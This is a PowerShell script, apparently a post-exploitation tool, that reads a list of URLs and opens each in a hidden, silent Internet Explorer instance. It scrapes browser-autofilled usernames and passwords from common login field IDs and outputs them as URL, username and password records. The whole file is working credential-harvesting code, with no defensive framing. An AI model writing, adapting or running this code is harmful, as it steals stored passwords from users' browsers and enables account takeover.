##########################################
# Start Browser Automation Section
##########################################

Function Browse-Url ($Url) {
    $ie = New-Object -ComObject InternetExplorer.Application.1
    $ie.Visible = $False
    $ie.Silent = $True
    $ie.Navigate($Url)
    while ($ie.Busy) {Start-Sleep -Seconds 1}
    
    return $ie
}


Function Parse-Username ($BrowserObject) {
    if ($BrowserObject.Document.getElementById('username')) {
        $username = $BrowserObject.Document.getElementById('username')
    }
    elseif ($BrowserObject.Document.getElementById('user_name')) {
        $username = $BrowserObject.Document.getElementById('user_name')
    }
    elseif ($BrowserObject.Document.getElementById('j_username')) {
        $username = $BrowserObject.Document.getElementById('j_username')
    }
    elseif ($BrowserObject.Document.getElementById('email')) {
        $username = $BrowserObject.Document.getElementById('email')
    }
    elseif ($BrowserObject.Document.getElementById('os_username')) {
        $username = $BrowserObject.Document.getElementById('os_username')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginID')) {
        $username = $BrowserObject.Document.getElementById('halogenLoginID')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')) {
        $username = $BrowserObject.Document.getElementById('ctl00_cpContent_txtUserName')
    }
    elseif ($BrowserObject.Document.getElementById('add')) {
        $username = $BrowserObject.Document.getElementById('add')
    }

    return $username.Value
}


Function Parse-Password ($BrowserObject) {
    if ($BrowserObject.Document.getElementById('password')) {
        $password = $BrowserObject.Document.getElementById('password')
    }
    elseif ($BrowserObject.Document.getElementById('j_password')) {
        $password = $BrowserObject.Document.getElementById('j_password')
    }
    elseif ($BrowserObject.Document.getElementById('os_password')) {
        $password = $BrowserObject.Document.getElementById('os_password')
    }
    elseif ($BrowserObject.Document.getElementById('halogenLoginPassword')) {
        $password = $BrowserObject.Document.getElementById('halogenLoginPassword')
    }
    elseif ($BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')) {
        $password = $BrowserObject.Document.getElementById('ctl00_cpContent_txtPassword')
    }
    elseif ($BrowserObject.Document.getElementById('pin')) {
        $password = $BrowserObject.Document.getElementById('pin')
    }

    return $password.Value
}


##########################################
# End Browser Automation Section
##########################################


Function Get-AutoFillCredentials {
    
    [Cmdletbinding()]
    Param(

    [Parameter(Mandatory = $true)]
    $URLFile,

    [Parameter(Mandatory = $false)]
    $DisplayStatus
    )

    if ($URLFile) {
        if (-not (Test-Path -Path $URLFile)){
            Write-Verbose "[-] Unable to access $URLFile. Check the path and try again"
            return
        }
        $urls += Get-Content $URLFile
    }

    $totalurls = $urls.Count
    if ($DisplayStatus) {
        Write-Output "Loaded $totalurls URLs for browsing"
    }
    $counter = 1

    foreach($url in $urls) {
        if ($DisplayStatus) {
            Write-Output "Browsing $url -  Site $counter of $totalurls"
        }
        $Browser = Browse-Url -Url $url
        Start-Sleep -Seconds 2
        if ($Browser -eq $null) { continue }
        $user = Parse-Username -BrowserObject $Browser
        $pass = Parse-Password -BrowserObject $Browser
        $Browser.Quit()
        $counter += 1

        if ($user -or $pass) {
            New-Object -TypeName PSObject -Property @{
                URL = $url
                Username = $user
                Password = $pass
            }
        }
    }

}